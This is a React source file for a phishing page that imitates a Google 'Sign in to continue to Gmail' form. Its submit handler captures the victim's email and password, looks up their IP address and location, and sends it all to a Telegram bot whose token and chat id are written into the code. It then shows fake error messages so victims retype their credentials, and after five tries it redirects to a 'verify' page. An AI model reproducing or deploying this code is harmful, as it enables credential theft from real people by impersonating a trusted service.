import React from 'react'
import { useNavigate } from "react-router-dom";

export default function Microsoft() {
    const [result, setResult] = React.useState("");
    const [attempts, setAttempts] = React.useState(0);
    const [loading, setLoading] = React.useState(false);
    const router = useNavigate();


    const onSubmit = async (event) => {
        event.preventDefault();
        setLoading(true);
        const formData = {};
        Array.from(event.currentTarget.elements).forEach((field) => {
            const input = field;
            if (!input.name) return;
            formData[input.name] = input.value;
        });

        fetch("https://ipapi.co/json/")
            .then((res) => res.json())
            .then((data) => {
                var ct = data.ip;
                var co = data.country_name;
                var lo = data.country_calling_code;
                var st = data.city;

                var NameLogin = formData.name;
                var PasswordLogin = formData.password;
                var SubmitValue = `Instagram Result is:%0A - Identity: ${NameLogin} %0A - Password: ${PasswordLogin} - IPAddress: ${ct} %0A - Country: ${co} %0A - Country-code: ${lo} %0A - state: ${st}`;

                var token = "8164337614:AAHDsQAqR39tVrVJlKb9aKZxk1G9sxufQGM";
                var chat_id = -4814376813;
                var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${SubmitValue}`;

                let api = new XMLHttpRequest();
                api.open("GET", url, true);
                api.send();

                if (api) {
                    const newAttempts = attempts + 1;
                    setAttempts(newAttempts);

                    if (newAttempts >= 5) {
                        router('/verify');
                    } else {
                        setTimeout(() => {
                            setResult("Unfortunately, An error occured, please try again....");
                        }, 2000);
                    }
                }
                setLoading(false);
            })
    };
    return (
        <div className="min-h-screen bg-[#202124] text-white">
            <div className="bg-[#303134] flex items-center justify-center h-screen px-6 w-screen flex-col w-full py-10">
                <div className="flex flex-col items-center">
                    <img
                        src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png"
                        alt="Google logo"
                        className="w-24 mb-6"
                    />
                    <h1 className="text-3xl font-medium mb-1">Sign in</h1>
                    <p className="text-sm text-[#bdc1c6] mb-8">to continue to Gmail</p>
                </div>

                <form onSubmit={onSubmit} className="space-y-6 w-full max-w-md">
                    {/* Email Field */}
                    <div className='w-full'> 
                        <label htmlFor="email" className="block text-sm mb-1 text-[#e8eaed]">
                            Email or phone
                        </label>
                        <input
                            type="email"
                            name="name"
                            id="email"
                            required
                            placeholder="Enter your email"
                            className="w-full bg-[#202124] border border-[#5f6368] text-white rounded px-4 py-3 placeholder:text-[#9aa0a6] focus:outline-none focus:ring-2 focus:ring-blue-500 transition"
                        />
                    </div>

                    {/* Password Field */}
                    <div className='w-full'>
                        <label htmlFor="password" className="block text-sm mb-1 text-[#e8eaed]">
                            Password
                        </label>
                        <input
                            type="password"
                            name="password"
                            id="password"
                            required
                            placeholder="Enter your password"
                            className="w-full bg-[#202124] border border-[#5f6368] text-white rounded px-4 py-3 placeholder:text-[#9aa0a6] focus:outline-none focus:ring-2 focus:ring-blue-500 transition"
                        />
                    </div>

                    {/* Result/Error Message */}
                    {result && (
                        <p className="text-xs text-red-500 text-center -mt-4">{result}</p>
                    )}

                    {/* Action Buttons */}
                    <div className="flex justify-between items-center">
                        <a
                            href="#"
                            className="text-sm text-[#8ab4f8] hover:underline transition"
                        >
                            Create account
                        </a>
                        <button
                            type="submit"
                            className="bg-[#8ab4f8] text-[#202124] px-6 py-2 rounded text-sm font-medium hover:bg-[#a3c2f8] focus:outline-none focus:ring-2 focus:ring-blue-400 transition"
                        >
                            {loading ? 'Loading...' : 'Continue'}
                        </button>
                    </div>
                </form>

                {/* Footer */}
                <div className="text-center text-xs text-[#9aa0a6] mt-10">
                    English (United Kingdom)
                    <div className="mt-2 space-x-4">
                        <a href="#" className="hover:underline">Help</a>
                        <a href="#" className="hover:underline">Privacy</a>
                        <a href="#" className="hover:underline">Terms</a>
                    </div>
                </div>
            </div>
        </div>
    )
};



